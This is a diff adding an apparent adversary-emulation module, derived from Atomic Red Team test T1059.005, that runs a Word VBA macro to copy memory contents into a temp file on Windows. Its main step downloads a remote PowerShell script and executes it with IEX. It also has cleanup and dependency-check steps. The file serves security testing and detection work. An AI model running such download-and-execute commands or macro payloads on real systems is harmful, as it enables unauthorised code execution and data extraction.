@@ -1,0 +1,105 @@
+{
+  "id": "8faff437-a114-4547-9a60-749652a03df6",
+  "name": "Extract Memory via VBA",
+  "description": "This module attempts to emulate malware authors utilizing well known techniques to extract data from memory/binary files. To do this\nwe first create a string in memory then pull out the pointer to that string. Finally, it uses this pointer to copy the contents of that\nmemory location to a file stored in the $env:TEMP\\atomic_t1059_005_test_output.bin.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "a705c9f9-526b-4c35-916e-eabe79ca03b0",
+      "type": "execute-command",
+      "data": {
+        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) \nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1059.005\\src\\T1059_005-macrocode.txt\" -officeProduct \"Word\" -sub \"Extract\"\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "5930b686-a1cf-44e7-8314-5275c5dd0d02",
+      "type": "execute-command",
+      "data": {
+        "command": "Remove-Item \"$env:TEMP\\atomic_t1059_005_test_output.bin\" -ErrorAction Ignore\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "49411e9f-7903-4e1a-804f-1c7518af1ce3",
+      "name": "Check dependency 1/1",
+      "description": "Microsoft #{ms_product} must be installed\n",
+      "type": "execute-command",
+      "data": {
+        "command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "89ada9c4-6a14-4b1f-9f9d-04f7e1d9ec42",
+      "name": "Resolve dependency 1/1",
+      "description": "Microsoft #{ms_product} must be installed\n",
+      "type": "execute-command",
+      "data": {
+        "command": "Write-Host \"You will need to install Microsoft #{ms_product} manually to meet this requirement\"\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "a014b329-a727-4d6d-b228-ac4b1c625e12",
+      "name": "Re-check dependency 1/1",
+      "description": "Microsoft #{ms_product} must be installed\n",
+      "type": "execute-command",
+      "data": {
+        "command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "a705c9f9-526b-4c35-916e-eabe79ca03b0",
+      "p": "on-success",
+      "o": "5930b686-a1cf-44e7-8314-5275c5dd0d02"
+    },
+    {
+      "s": "a705c9f9-526b-4c35-916e-eabe79ca03b0",
+      "p": "on-failure",
+      "o": "5930b686-a1cf-44e7-8314-5275c5dd0d02"
+    },
+    {
+      "s": "49411e9f-7903-4e1a-804f-1c7518af1ce3",
+      "p": "on-success",
+      "o": "a705c9f9-526b-4c35-916e-eabe79ca03b0"
+    },
+    {
+      "s": "49411e9f-7903-4e1a-804f-1c7518af1ce3",
+      "p": "on-failure",
+      "o": "89ada9c4-6a14-4b1f-9f9d-04f7e1d9ec42"
+    },
+    {
+      "s": "89ada9c4-6a14-4b1f-9f9d-04f7e1d9ec42",
+      "p": "on-success",
+      "o": "a014b329-a727-4d6d-b228-ac4b1c625e12"
+    },
+    {
+      "s": "a014b329-a727-4d6d-b228-ac4b1c625e12",
+      "p": "on-failure",
+      "o": "a705c9f9-526b-4c35-916e-eabe79ca03b0"
+    }
+  ],
+  "tags": [
+    "T1059.005",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "ms_product",
+      "type": "string",
+      "description": "Maldoc application Word",
+      "value": "Word"
+    }
+  ]
+}
